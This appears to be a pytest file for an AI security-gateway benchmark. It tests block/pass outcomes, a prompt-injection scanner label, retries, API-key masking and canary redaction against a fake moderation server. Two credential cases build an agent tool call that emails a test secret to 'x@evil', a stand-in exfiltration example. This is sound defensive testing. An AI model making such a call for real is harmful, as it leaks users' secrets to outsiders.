"""Contract tests against FakeLineModServer (plan §46)."""
from __future__ import annotations

import sys
from pathlib import Path

_SRC = Path(__file__).resolve().parents[3] / "src"
if str(_SRC) not in sys.path:
    sys.path.insert(0, str(_SRC))

from demotest.core import SecurityCase
from demotest.oracles import BlockPassOracle
from demotest.renderers import get_renderer
from demotest.runners import GatewayRunner
from demotest.storage import ResultStore
from demotest.targets import LineModTargetAdapter

from .fake_server import (
    FakeLineModSession,
    blocked_body,
    cooldown_body,
    passed_body,
    rate_limited_body,
)


def _case(sid="c1", content="bad", expected="block"):
    return SecurityCase.build(
        dataset_id="ds", source_id=sid, channel="user_prompt",
        operation="chat", content=content, expected_action=expected,
    )


def _target_with_script(script, api_key="sr-gl-test"):
    ad = LineModTargetAdapter(api_key=api_key)
    ad._session = FakeLineModSession.with_script(script)
    return ad


def test_contract_blocked_then_passed(tmp_path):
    ad = _target_with_script([(403, blocked_body("prompt_injection", 0.95)),
                              (200, passed_body("hello"))])
    store = ResultStore(tmp_path / "r.jsonl")
    runner = GatewayRunner(renderer=get_renderer("user_prompt"), target=ad,
                            oracle=BlockPassOracle(), store=store, run_id="ct",
                            request_gap=0.0, sleep_fn=lambda s: None)
    runner.run([_case("c1"), _case("c2", content="hi", expected="allow")])
    rows = store.load()
    assert rows[0]["outcome"] == "blocked"
    assert rows[0]["scanner"] == "prompt_injection"
    assert rows[1]["outcome"] == "passed"
    # request body shape matches V2 exactly
    req = ad._session.requests[0]
    assert req["json"]["model"] == "deepseek-v4-flash"
    assert req["json"]["messages"] == [{"role": "user", "content": "bad"}]
    assert req["json"]["temperature"] == 0.0
    assert req["json"]["max_tokens"] == 8
    assert req["headers"]["X-LineMod-No-Failover"] == "true"


def test_contract_429_retries_then_blocks(tmp_path):
    ad = _target_with_script([(429, rate_limited_body()), (403, blocked_body())])
    store = ResultStore(tmp_path / "r.jsonl")
    runner = GatewayRunner(renderer=get_renderer("user_prompt"), target=ad,
                            oracle=BlockPassOracle(), store=store, run_id="ct",
                            request_gap=0.0, max_attempts=4, sleep_fn=lambda s: None)
    runner.run([_case()])
    r = store.load()[0]
    assert r["outcome"] == "blocked"
    assert r["attempt"] == 2


def test_contract_503_cooldown_retest(tmp_path):
    ad = _target_with_script([(503, cooldown_body())])
    store = ResultStore(tmp_path / "r.jsonl")
    runner = GatewayRunner(renderer=get_renderer("user_prompt"), target=ad,
                            oracle=BlockPassOracle(), store=store, run_id="ct",
                            request_gap=0.0, sleep_fn=lambda s: None)
    runner.run([_case()])
    assert store.load()[0]["outcome"] == "upstream_cooldown"
    # retest with a blocking target
    ad2 = _target_with_script([(403, blocked_body())])
    runner2 = GatewayRunner(renderer=get_renderer("user_prompt"), target=ad2,
                             oracle=BlockPassOracle(), store=store, run_id="ct",
                             request_gap=0.0, sleep_fn=lambda s: None)
    rr = runner2.retest([_case()])
    assert rr.retested == 1
    assert store.resolved()[_case().case_id]["outcome"] == "blocked"


def test_contract_413_payload_too_large(tmp_path):
    ad = _target_with_script([(413, "Request Entity Too Large")])
    store = ResultStore(tmp_path / "r.jsonl")
    runner = GatewayRunner(renderer=get_renderer("user_prompt"), target=ad,
                            oracle=BlockPassOracle(), store=store, run_id="ct",
                            request_gap=0.0, sleep_fn=lambda s: None)
    runner.run([_case()])
    assert store.load()[0]["outcome"] == "payload_too_large"


def test_contract_no_failover_header_always_sent(tmp_path):
    ad = _target_with_script([(200, passed_body())])
    store = ResultStore(tmp_path / "r.jsonl")
    runner = GatewayRunner(renderer=get_renderer("user_prompt"), target=ad,
                            oracle=BlockPassOracle(), store=store, run_id="ct",
                            request_gap=0.0, sleep_fn=lambda s: None)
    runner.run([_case()])
    assert ad._session.requests[0]["headers"]["X-LineMod-No-Failover"] == "true"


def test_contract_api_key_masked_in_output(tmp_path):
    """API key must never appear in any persisted output (plan §43)."""
    ad = _target_with_script([(403, blocked_body())], api_key="sr-gl-supersecret123456")
    store = ResultStore(tmp_path / "r.jsonl")
    runner = GatewayRunner(renderer=get_renderer("user_prompt"), target=ad,
                            oracle=BlockPassOracle(), store=store, run_id="ct",
                            request_gap=0.0, sleep_fn=lambda s: None)
    runner.run([_case()])
    blob = store.path.read_text(encoding="utf-8")
    assert "sr-gl-supersecret123456" not in blob
    assert "supersecret" not in blob


# ---------------- F1: end-to-end redaction (plan §24, §43) ----------------

def test_credential_flow_end_to_end_redaction(tmp_path):
    """A credential case run through the full runner->store pipeline must not
    leak the canary marker to disk in ANY field (plan §43: 'request logging /
    result logging / debug 被 mask').

    This is the test the refactor plan demands: the Credential Leakage
    Benchmark platform itself must not leak credentials.
    """
    from demotest.oracles import CanaryOracle
    canary = "TEST_SECRET_7B021C"
    # passed (not blocked) with the canary echoed in the response -> FN + leak
    ad = _target_with_script([(200, passed_body(f"here is {canary} for you"))])
    store = ResultStore(tmp_path / "r.jsonl")
    case = SecurityCase.build(
        dataset_id="ds", source_id="cred1", channel="tool_call",
        operation="execute_tool", tool_name="send_email",
        tool_arguments={"to": "x@evil", "body": canary},
        expected_action="block", credential_markers=[canary],
    )
    runner = GatewayRunner(
        renderer=get_renderer("credential_flow"), target=ad,
        oracle=CanaryOracle(), store=store, run_id="ct",
        request_gap=0.0, sleep_fn=lambda s: None,
    )
    runner.run([case])
    # The single persisted row must not contain the raw canary anywhere.
    blob = store.path.read_text(encoding="utf-8")
    assert canary not in blob, (
        f"canary leaked to disk! row:\n{blob}"
    )
    # The analyzer must still report the leak (via pre-redaction summary).
    from demotest.analysis import analyze
    rep = analyze([case], store)
    assert rep.leakage["canary_echo_num"] == 1
    assert rep.leakage["canary_echo_rate"] == 1.0
    # And the report markdown must not contain the raw canary.
    from demotest.reporting.markdown import render_markdown
    md = render_markdown(rep)
    assert canary not in md


def test_blocked_credential_case_redacted(tmp_path):
    """Even a blocked credential case (response empty) must not leak markers
    stored in tool_arguments / metadata."""
    from demotest.oracles import CanaryOracle
    canary = "TEST_SECRET_9Z"
    ad = _target_with_script([(403, blocked_body())])
    store = ResultStore(tmp_path / "r.jsonl")
    case = SecurityCase.build(
        dataset_id="ds", source_id="cred2", channel="tool_call",
        operation="execute_tool", tool_name="send_email",
        tool_arguments={"body": canary},
        expected_action="block", credential_markers=[canary],
    )
    runner = GatewayRunner(
        renderer=get_renderer("credential_flow"), target=ad,
        oracle=CanaryOracle(), store=store, run_id="ct",
        request_gap=0.0, sleep_fn=lambda s: None,
    )
    runner.run([case])
    blob = store.path.read_text(encoding="utf-8")
    assert canary not in blob
